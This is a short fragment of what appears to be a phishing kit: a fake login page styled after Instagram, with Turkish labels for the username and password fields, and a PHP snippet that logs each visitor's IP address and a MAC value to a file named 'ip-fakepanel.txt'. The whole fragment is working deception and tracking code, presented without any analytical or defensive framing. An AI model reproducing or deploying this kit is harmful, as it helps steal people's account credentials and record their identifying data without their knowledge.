                        ...
                        <div class="instaclass6">
                           ...
                           <form method="POST" action="" 
                              ...
                              <div class="instaclass8 instaclass9">
                                <input type="text"class="instaclass10 instaclass11" aria-describedby="" aria-label="Kullanıcı" aria-required="true" name="userid22" placeholder="Username">
                              <div class="suggestUsers"><ul></ul></div>
                              </div>
                              <div class="instaclass8 instaclass9">
                                 <input type="password"  class="instaclass10 instaclass11" aria-describedby="" aria-label="Şifre" aria-required="true" name="pswrd" placeholder="Password">
...
$ac = fopen("ip-fakepanel.txt","a+");
$ip = GetIP();
$userlar = ("__________________\n İp Adresi:".$ip."\n Mac Adresi: ".$mycom."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
